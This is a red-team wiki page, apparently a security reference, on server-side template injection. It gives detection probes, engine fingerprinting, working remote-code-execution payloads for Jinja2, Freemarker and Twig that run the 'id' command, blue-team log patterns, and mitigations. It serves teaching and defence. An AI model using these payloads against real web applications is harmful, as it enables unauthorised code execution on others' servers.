---
title: "Server-Side Template Injection (SSTI)"
category: "red-team"
tags: ["web", "ssti", "injection", "rce"]
platform: "web"
mitre: ["T1190"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# Server-Side Template Injection (SSTI)

## TL;DR
User input is embedded into a server-side template and evaluated by the engine. Often escalates from reflected output to full RCE via the engine's object model. Identify the engine, then use its sandbox-escape gadget.

## Detection
```text
Inject a math expression – if it evaluates, you likely have SSTI:
  ${7*7}   {{7*7}}   #{7*7}   <%= 7*7 %>   *{7*7}
Result "49" (not literal) = template evaluation.
```

## Fingerprint the engine (polyglot triage)
```text
{{7*7}} -> 49 and {{7*'7'}} -> 7777777  => Jinja2 (Python) / Twig
${7*7}  -> 49                           => Java (Freemarker/Spring EL), Thymeleaf
#{7*7}                                  => Ruby (ERB variants), some Java
<%= 7*7 %>                              => ERB (Ruby) / EJS (Node)
```

## Exploitation (examples)
```python
# Jinja2 (Python) – reach os.system via object traversal
{{ ''.__class__.__mro__[1].__subclasses__() }}   # enumerate classes
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
```text
# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Twig (PHP)
{{['id']|filter('system')}}
```
- `tplmap` automates detection + exploitation across engines.

## Detection (Blue Team)
- WAF/log patterns: template markers (`{{`, `${`, `<%`), `__class__`, `__globals__`, `popen`.
- Sandbox-escape indicators, unexpected process spawns from the web app.

## Mitigation / Hardening
- Don't pass user input into templates as template code — pass it as **data/variables**.
- Use logic-less templates (Mustache) or a sandboxed engine; disable dangerous features.
- Input validation + context-aware handling; run the app with least privilege.

## Sources
- [PortSwigger – SSTI](https://portswigger.net/web-security/server-side-template-injection) · [tplmap](https://github.com/epinna/tplmap)
